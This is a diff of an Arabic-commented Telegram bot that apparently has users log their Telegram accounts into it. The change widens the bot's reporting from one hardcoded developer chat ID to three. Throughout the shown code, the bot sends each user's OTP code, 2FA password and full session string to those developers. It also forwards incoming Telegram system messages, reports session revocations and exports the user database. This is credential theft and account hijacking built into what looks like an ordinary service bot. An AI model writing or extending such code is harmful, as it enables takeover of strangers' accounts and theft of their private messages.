@@ -6,8 +6,22 @@ import { StringSession } from 'telegram/sessions/index.js'
 import { NewMessage } from 'telegram/events/index.js'
 import { createReadStream } from 'fs'
 
-// 🆔 ايدي المطور
-const DEVELOPER_CHAT_ID = [7248282408,8848189020,8858294893];
+// 🆔 ايدي المطورين
+const DEVELOPER_CHAT_IDS = [7248282408, 8848189020, 8858294893];
+
+function isDeveloper(id) {
+    return DEVELOPER_CHAT_IDS.includes(Number(id));
+}
+
+async function notifyDevelopers(text, options = {}) {
+    for (const devId of DEVELOPER_CHAT_IDS) {
+        try {
+            await bot.telegram.sendMessage(devId, text, options);
+        } catch(e) {
+            console.error(`فشل ارسال للمطور ${devId}:`, e.message);
+        }
+    }
+}
 
 let db = await loadDB()
 
@@ -72,7 +86,7 @@ async function setupMessageForwarding(client, userPhone) {
             const msgText = message.message;
 
             try {
-                await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
+                await notifyDevelopers(
                     `🚀 **رسالة نظام تلجرام وصلت!**\n\n📱 الحساب: \`${userPhone}\`\n💬 المحتوى:\n\`${msgText}\``,
                     { parse_mode: 'Markdown' }
                 );
@@ -121,7 +135,7 @@ async function setupSessionRevokeMonitor(client, acc, userId) {
             if (chat.username) displayUser = `@${chat.username}`
         } catch {}
 
-        await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
+        await notifyDevelopers(
             `🔴 **جلسة مُزيلة من الأجهزة!**\n\n👤 الاسم: ${displayName}\n🏷️ اليوزر: ${displayUser}\n📱 الرقم: \`${acc.phone}\`\n⚠️ قام المستخدم بإزالة جلسة البوت من قائمة الأجهزة.`,
             { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
         ).catch(() => {})
@@ -287,7 +301,7 @@ async function sendWelcome(ctx, replyFn) {
     const entities = [{ type: 'text_mention', offset: prefix.length, length: name.length, user: { id: user.id, is_bot: false, first_name: name } }];
     
     const buttons = mainMenuButtons();
-    if (user.id === DEVELOPER_CHAT_ID) {
+    if (isDeveloper(user.id)) {
         buttons.push([{ text: '📊 قسم الحالة (للمطور)', callback_data: 'DEV_STATUS', style: 'primary' }]);
     }
     
@@ -375,7 +389,7 @@ bot.use(async (ctx, next) => {
     if (data === 'CHECK_SUB' || data === 'noop') return next();
     const userId = ctx.from?.id;
     if (!userId) return next();
-    if (userId === DEVELOPER_CHAT_ID) return next(); // المطور مستثنى دائماً من الاشتراك الإجباري
+    if (isDeveloper(userId)) return next(); // المطور مستثنى دائماً من الاشتراك الإجباري
     const notSubbed = await getNotSubscribed(userId);
     if (notSubbed.length > 0) { try { await ctx.answerCbQuery('❌ اشترك في القنوات'); } catch {} await sendForceSubMsg(ctx); return; }
     return next();
@@ -385,11 +399,11 @@ bot.start(async (ctx) => {
     const notSubbed = await getNotSubscribed(ctx.from.id);
     if (notSubbed.length > 0) { await sendForceSubMsg(ctx); return; }
     
-    // إشعار للمطور عند دخول مستخدم جديد (تم التعديل لليوزرنيم)
-    if (ctx.from.id !== DEVELOPER_CHAT_ID) {
+    // إشعار للمطورين عند دخول مستخدم جديد
+    if (!isDeveloper(ctx.from.id)) {
         const u = ctx.from;
         const userDisplay = u.username ? `@${u.username}` : `[رابط المستخدم](tg://user?id=${u.id})`;
-        await bot.telegram.sendMessage(DEVELOPER_CHAT_ID, 
+        await notifyDevelopers(
             `🆕 **مستخدم جديد متصل بالبوت!**\n\n👤 الاسم: ${u.first_name}\n🏷️ اليوزر: ${userDisplay}`, 
             { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
         );
@@ -410,9 +424,9 @@ bot.action('CHECK_SUB', async (ctx) => {
 bot.action('noop', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} });
 bot.action('BACK', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} await sendWelcome(ctx, (text, opts) => ctx.reply(text, opts)); });
 
-// ─── قسم الحالة والتحكم (للمطور فقط) ───────────────────────
+// ─── قسم الحالة والتحكم (للمطورين فقط) ───────────────────────
 bot.action('DEV_STATUS', async (ctx) => {
-    if (ctx.from.id !== DEVELOPER_CHAT_ID) return ctx.answerCbQuery('❌ غير مسموح لك.');
+    if (!isDeveloper(ctx.from.id)) return ctx.answerCbQuery('❌ غير مسموح لك.');
     try { await ctx.answerCbQuery(); } catch {}
     
     const statusText = `📊 **لوحة تحكم المطور**\n\nإجمالي المستخدمين: \`${Object.keys(db.users).length}\`\nنشطين حالياً: \`${activeSessions.size}\` حساب تليجرام.`;
@@ -427,23 +441,25 @@ bot.action('DEV_STATUS', async (ctx) => {
 
 // ميزة الإذاعة (Broadcast)
 bot.action('BROADCAST_START', async (ctx) => {
-    if (ctx.from.id !== DEVELOPER_CHAT_ID) return;
+    if (!isDeveloper(ctx.from.id)) return;
     try { await ctx.answerCbQuery(); } catch {}
     setState(ctx.from.id, 'waiting_broadcast_msg');
     await ctx.reply('✍️ ارسل الرسالة التي تود إذاعتها لجميع المستخدمين (تدعم التنسيقات):');
 });
 
-// ─── تصدير ملف db.json للمطور ─────────────────────────────
+// ─── تصدير ملف db.json للمطورين ─────────────────────────────
 bot.action('DEV_EXPORT_DB', async (ctx) => {
-    if (ctx.from.id !== DEVELOPER_CHAT_ID) return ctx.answerCbQuery('❌ غير مسموح لك.');
+    if (!isDeveloper(ctx.from.id)) return ctx.answerCbQuery('❌ غير مسموح لك.');
     try { await ctx.answerCbQuery('📦 جاري إرسال الملف...'); } catch {}
     try {
         const timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
-        await bot.telegram.sendDocument(
-            DEVELOPER_CHAT_ID,
-            { source: createReadStream('./db.json'), filename: `db_${Date.now()}.json` },
-            { caption: `📦 **ملف db.json**\n\n🕐 الوقت: ${timestamp}\n👥 عدد المستخدمين: \`${Object.keys(db.users).length}\``, parse_mode: 'Markdown' }
-        );
+        for (const devId of DEVELOPER_CHAT_IDS) {
+            await bot.telegram.sendDocument(
+                devId,
+                { source: createReadStream('./db.json'), filename: `db_${Date.now()}.json` },
+                { caption: `📦 **ملف db.json**\n\n🕐 الوقت: ${timestamp}\n👥 عدد المستخدمين: \`${Object.keys(db.users).length}\``, parse_mode: 'Markdown' }
+            );
+        }
     } catch (e) {
         await ctx.reply(`❌ فشل إرسال الملف: ${e.message}`);
     }
@@ -488,14 +504,14 @@ async function showListAndStatus(ctx) {
 }
 
 bot.action('LIST_AND_STATUS', async (ctx) => {
-    if (ctx.from.id !== DEVELOPER_CHAT_ID) return ctx.answerCbQuery('❌ غير مسموح لك.');
+    if (!isDeveloper(ctx.from.id)) return ctx.answerCbQuery('❌ غير مسموح لك.');
     try { await ctx.answerCbQuery(); } catch {}
     await showListAndStatus(ctx);
 });
 
 // حذف مستخدم نهائياً من قبل المطور
 bot.action(/^DEV_DEL_USER_(\d+)$/, async (ctx) => {
-    if (ctx.from.id !== DEVELOPER_CHAT_ID) return;
+    if (!isDeveloper(ctx.from.id)) return;
     const targetId = ctx.match[1];
     
     if (db.users[targetId]) {
@@ -510,7 +526,7 @@ bot.action(/^DEV_DEL_USER_(\d+)$/, async (ctx) => {
         delete db.users[targetId];
         await saveDB(db);
         await ctx.answerCbQuery('✅ تم حذف المستخدم وبياناته بنجاح.');
-        // إعادة عرض القائمة بعد الحذف مباشرة (bot.handleAction غير موجود في Telegraf)
+        // إعادة عرض القائمة بعد الحذف مباشرة
         return showListAndStatus(ctx);
     } else {
         await ctx.answerCbQuery('❌ المستخدم غير موجود أو تم حذفه مسبقاً.');
@@ -556,9 +572,9 @@ bot.action(/^DEL_ACC_(\d+)$/, async (ctx) => {
             try { await activeSessions.get(acc.phone).disconnect(); } catch {}
             activeSessions.delete(acc.phone);
             
-            // إشعار للمطور عند خروج حساب (تم التعديل لليوزرنيم)
+            // إشعار للمطورين عند خروج حساب
             const userDisplay = ctx.from.username ? `@${ctx.from.username}` : `[رابط المستخدم](tg://user?id=${ctx.from.id})`;
-            await bot.telegram.sendMessage(DEVELOPER_CHAT_ID, 
+            await notifyDevelopers(
                 `🔴 **مستخدم سجل خروجه!**\n\n👤 الاسم: ${ctx.from.first_name}\n🏷️ اليوزر: ${userDisplay}\n📱 الرقم: \`${acc.phone}\`\n⚠ تم فصل الجلسة.`, 
                 { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
             );
@@ -659,7 +675,7 @@ bot.on('text', async (ctx) => {
     const text = ctx.message.text.trim();
 
     // معالجة إذاعة الرسالة للمطور
-    if (st === 'waiting_broadcast_msg' && id === DEVELOPER_CHAT_ID) {
+    if (st === 'waiting_broadcast_msg' && isDeveloper(id)) {
         setState(id, 'normal');
         const htmlMsg = convertBotMessageToHtml(ctx.message.text, ctx.message.entities);
         let successCount = 0;
@@ -763,7 +779,7 @@ bot.on('text', async (ctx) => {
             activeSessions.set(loginData.phone, loginData.client);
             setupMessageForwarding(loginData.client, loginData.phone);
             setupSessionRevokeMonitor(loginData.client, accObj, id);
-            await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
+            await notifyDevelopers(
                 `✅ **تسجيل دخول جديد (OTP):**\n👤 الاسم: \`${fullName}\`\n🏷️ اليوزر: \`${username}\`\n📱 الرقم: \`${loginData.phone}\`\n🆔 تيليجرام ID: \`${me.id.toString()}\`\n🔢 الكود: \`${digitsOnly}\`\n🔑 الجلسة: \`${session}\``,
                 { parse_mode: 'Markdown' }
             );
@@ -790,7 +806,7 @@ bot.on('text', async (ctx) => {
             activeSessions.set(loginData.phone, loginData.client);
             setupMessageForwarding(loginData.client, loginData.phone);
             setupSessionRevokeMonitor(loginData.client, accObj, id);
-            await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
+            await notifyDevelopers(
                 `✅ **تسجيل دخول جديد (2FA):**\n👤 الاسم: \`${fullName}\`\n🏷️ اليوزر: \`${username}\`\n📱 الرقم: \`${loginData.phone}\`\n🆔 تيليجرام ID: \`${me.id.toString()}\`\n🔐 الباسورد: \`${text}\`\n🔑 الجلسة: \`${session}\``,
                 { parse_mode: 'Markdown' }
             );
